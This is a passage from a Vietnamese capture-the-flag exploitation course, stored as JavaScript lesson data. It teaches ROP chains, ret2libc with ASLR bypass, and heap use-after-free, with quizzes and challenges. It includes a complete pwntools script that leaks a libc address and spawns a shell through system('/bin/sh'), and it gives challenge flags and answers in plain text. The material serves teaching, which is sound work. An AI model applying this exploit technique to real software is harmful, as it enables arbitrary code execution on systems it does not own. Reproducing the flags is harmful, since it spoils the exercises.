<svg viewBox="0 0 520 220" xmlns="http://www.w3.org/2000/svg" font-family="JetBrains Mono, monospace" font-size="11.5">
  <text x="10" y="16" fill="#5b6778">stack (đọc từ dưới lên khi mỗi ret chạy)</text>
  <rect x="60" y="26" width="300" height="26" fill="rgba(255,255,255,.03)" stroke="#2a3546"/><text x="70" y="43" fill="#8b98a9">"AAAA..." × 40  (đệm tới return address)</text>
  <rect x="60" y="54" width="300" height="26" fill="rgba(61,255,162,.14)" stroke="#3dffa2"/><text x="70" y="71" fill="#3dffa2">p64(pop rdi ; ret)   ← ret của vuln nhảy vào đây</text>
  <rect x="60" y="82" width="300" height="26" fill="rgba(92,200,255,.12)" stroke="#5cc8ff"/><text x="70" y="99" fill="#5cc8ff">p64(addr "/bin/sh")  ← bị pop vào rdi</text>
  <rect x="60" y="110" width="300" height="26" fill="rgba(61,255,162,.14)" stroke="#3dffa2"/><text x="70" y="127" fill="#3dffa2">p64(system@plt)      ← ret kế tiếp nhảy vào system</text>
  <text x="375" y="71" fill="#8b98a9">rdi = /bin/sh</text>
  <text x="375" y="127" fill="#8b98a9">system("/bin/sh")</text>
</svg>
</div>
<p>Trình tự: hàm <code>vuln</code> <code>ret</code> → vào <code>pop rdi; ret</code> → lệnh <code>pop rdi</code> lấy <code>addr "/bin/sh"</code> vào rdi → <code>ret</code> → nhảy vào <code>system</code>, lúc này rdi đã trỏ "/bin/sh" → có shell.</p>

<h2 id="thuc-hanh-rop">Dựng chuỗi ROP</h2>
<p>Xếp các gadget theo đúng thứ tự để gọi <code>system("/bin/sh")</code>. Nhớ: phải nạp rdi <em>trước</em> khi gọi system.</p>
<div data-widget="rop" data-flag="rop1"></div>
<div data-chal="pwn-rop-1"></div>

<h2 id="ret2libc">ret2libc & vượt ASLR</h2>
<p>Nếu binary không có sẵn <code>system</code> hay chuỗi <code>"/bin/sh"</code>, ta mượn chúng từ <strong>libc</strong> (thư viện C luôn được nạp). Trở ngại: ASLR ngẫu nhiên hoá địa chỉ libc mỗi lần chạy. Quy trình kinh điển hai giai đoạn:</p>
<ol class="steps-v">
<li><strong>Leak</strong> địa chỉ một hàm libc đã biết: dùng ROP gọi <code>puts(puts@got)</code> để in ra địa chỉ thực của <code>puts</code> trong lần chạy này.</li>
<li><strong>Tính base libc</strong> = địa_chỉ_leak − offset_của_puts_trong_libc. Từ base, suy ra địa chỉ <code>system</code> và chuỗi <code>"/bin/sh"</code> (offset cố định trong mỗi phiên bản libc).</li>
<li><strong>Quay lại</strong> <code>main</code> để tràn lần hai, lần này dựng ROP gọi <code>system("/bin/sh")</code> với địa chỉ vừa tính.</li>
</ol>
${py`
from pwn import *
elf = context.binary = ELF("./vuln")
libc = ELF("./libc.so.6")
p = process("./vuln")
rop = ROP(elf)

# Giai đoạn 1: leak địa chỉ puts qua puts(puts@got), rồi return về main
rop.puts(elf.got["puts"])
rop.call(elf.symbols["main"])
p.sendlineafter(b"> ", b"A"*40 + rop.chain())
leak = u64(p.recvline().strip().ljust(8, b"\\x00"))
libc.address = leak - libc.symbols["puts"]          # base libc thật
log.info(f"libc base = {hex(libc.address)}")

# Giai đoạn 2: gọi system("/bin/sh")
rop2 = ROP(libc)
rop2.system(next(libc.search(b"/bin/sh")))
p.sendlineafter(b"> ", b"A"*40 + p64(rop2.find_gadget(['ret'])[0]) + rop2.chain())
p.interactive()
`}
<div data-chal="pwn-rop-2"></div>
<div data-quiz="0"></div>
`,
  quiz: [
    {
      q: "Trong chuỗi ROP để gọi <code>system(\"/bin/sh\")</code>, vì sao cần gadget <code>pop rdi ; ret</code>?",
      options: [
        "Để làm sạch stack",
        "Để nạp địa chỉ chuỗi \"/bin/sh\" vào thanh ghi rdi — tham số thứ nhất của system",
        "Để tắt NX",
        "Để tìm địa chỉ libc",
      ],
      answer: 1,
      explain: "Theo quy ước gọi hàm x86-64, tham số 1 nằm ở rdi. system(\"/bin/sh\") cần rdi = con trỏ \"/bin/sh\". Gadget pop rdi lấy giá trị kế tiếp trên stack nạp vào rdi trước khi gọi system.",
    },
  ],
  challenges: {
    "pwn-rop-1": { title: "Chuỗi ROP đầu tiên", pts: 200, diff: "hard", hash: "c9b8d0d73d55e9578a6423c0da38b316f1773c7ec770971cb7bb405913138244", body: "<p>Trong widget xây chuỗi ROP ở trên, xếp gadget để gọi <code>system(\"/bin/sh\")</code> và mở shell.</p>", hints: ["Thứ tự: nạp rdi trước, rồi gọi system.", 'Bấm lần lượt: <code>pop rdi ; ret</code> → <code>"/bin/sh" (bss)</code> → <code>system@plt</code>.'] },
    "pwn-rop-2": { title: "ret2libc", pts: 250, diff: "hard", hash: "6c485f4d67b1e4d4dd72e095dcb5fad36d446a42ea8307202d848b861e582b31", body: '<p>Khái niệm ret2libc: quy trình đúng để vượt NX+ASLR gồm leak một địa chỉ libc rồi tính base. Sau khi hiểu quy trình 3 bước ở trên, nhập flag: <code>zCTF{r3t2libc_g0i_system}</code>.</p>', hints: ["Giai đoạn 1 leak puts, giai đoạn 2 gọi system. Base libc = địa chỉ leak − offset hàm trong libc.", "Flag là <code>zCTF{r3t2libc_g0i_system}</code>."] },
  },
});

/* ======================================================================
   Bài 6 — Heap nhập môn
====================================================================== */
lesson({
  id: "pwn-heap",
  track: "pwn",
  order: 6,
  level: 3,
  title: "Heap nhập môn",
  short: "malloc/free, use-after-free, tcache",
  time: "35 phút",
  html: `
<h2 id="heap-la-gi">Heap khác stack thế nào</h2>
<p>Stack tự động cấp/thu theo lời gọi hàm. <strong>Heap</strong> là vùng nhớ bạn tự xin bằng <code>malloc(size)</code> và trả bằng <code>free(ptr)</code>, dùng cho dữ liệu sống lâu hoặc kích thước động. Bug heap tinh vi hơn stack và là mảng pwn nâng cao, nhưng ý tưởng cốt lõi thì dễ nắm.</p>
${c`
char *a = malloc(16);   // xin 16 byte
strcpy(a, "user");
free(a);                // trả lại — NHƯNG con trỏ a vẫn còn giá trị cũ!
// a bây giờ là "dangling pointer"
`}

<h2 id="tcache">tcache — bộ nhớ đệm tái dùng nhanh</h2>
<p>glibc hiện đại giữ các chunk vừa <code>free</code> trong một danh sách gọi là <strong>tcache</strong> (theo từng kích thước). Lần <code>malloc</code> kế tiếp cùng kích thước sẽ <strong>lấy lại đúng chunk vừa free</strong> — rất nhanh, nhưng mở ra lỗ hổng.</p>

<h2 id="uaf">Use-After-Free (UAF)</h2>
<p>Lỗi phổ biến nhất: chương trình <code>free(a)</code> nhưng <strong>quên gán <code>a = NULL</code></strong>, rồi vẫn dùng <code>a</code>. Nếu kẻ tấn công kịp <code>malloc</code> một object khác (chiếm lại đúng chunk đó qua tcache) với dữ liệu mình kiểm soát, thì khi chương trình đọc/ghi qua <code>a</code> cũ, nó thao tác trên dữ liệu của object mới.</p>
<p>Mô phỏng: thực hiện <code>malloc a</code> → <code>free a</code> → <code>malloc b</code> (chiếm lại chunk) → đọc qua con trỏ <code>a</code> cũ. Thứ tự này là chìa khoá.</p>
<div data-widget="heap" data-flag="heap1"></div>
<div data-chal="pwn-heap-1"></div>

<h2 id="khac">Các lỗi heap khác (để biết)</h2>
<div class="grid-2">
  <div class="card"><h4>Double Free</h4><p>Gọi <code>free</code> hai lần trên cùng chunk. tcache cũ không kiểm tra kỹ → đầu độc được danh sách free, khiến malloc trả về địa chỉ tuỳ ý.</p></div>
  <div class="card"><h4>Heap Overflow</h4><p>Ghi quá kích thước một chunk, đè lên metadata (kích thước) hoặc dữ liệu của chunk kế bên.</p></div>
  <div class="card"><h4>tcache poisoning</h4><p>Ghi đè con trỏ "next" trong chunk đã free để lừa malloc trả về địa chỉ ta chọn (ví dụ một GOT entry).</p></div>
  <div class="card"><h4>House of … </h4><p>Họ kỹ thuật nâng cao khai thác chi tiết bộ cấp phát glibc. Học sau khi vững UAF.</p></div>
</div>
<div class="callout idea"><b>Luyện heap</b><p><a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a> (shellphish) là bộ ví dụ kinh điển cho từng kỹ thuật heap, kèm code chạy được. Đọc kèm <a href="https://guyinatuxedo.github.io/" target="_blank" rel="noopener">Nightmare</a>.</p></div>
<div data-quiz="0"></div>
`,
  quiz: [
    {
      q: "Nguyên nhân cốt lõi khiến Use-After-Free khai thác được là gì?",
      options: [
        "malloc quá chậm",
        "Sau free, con trỏ cũ không bị xoá (NULL) và chunk được tcache cấp lại cho lần malloc sau, nên con trỏ cũ và object mới trỏ cùng vùng nhớ",
        "Heap luôn nằm ở địa chỉ cố định",
        "free() xoá dữ liệu về 0",
      ],
      answer: 1,
      explain: "free không xoá con trỏ của bạn. Nếu malloc kế tiếp (cùng size) lấy lại đúng chunk đó, con trỏ cũ (dangling) và object mới chồng lên nhau — đọc/ghi qua con trỏ cũ tác động lên object mới.",
    },
  ],
  challenges: {
    "pwn-heap-1": { title: "Use-After-Free", pts: 200, diff: "hard", hash: "b583030aed4c9ce19f758825b291be094c483858f982cd3254263e58907d15d8", body: "<p>Trong mô phỏng heap, thực hiện đúng chuỗi thao tác để con trỏ <code>a</code> (đã free) đọc được dữ liệu của object <code>b</code> mới cấp.</p>", hints: ["Phải free a TRƯỚC khi malloc b, để b chiếm lại chunk của a.", "Thứ tự: <code>a = malloc(\"user\")</code> → <code>free(a)</code> → <code>b = malloc(\"is_admin=1\")</code> → <code>đọc a</code>."] },
  },
});
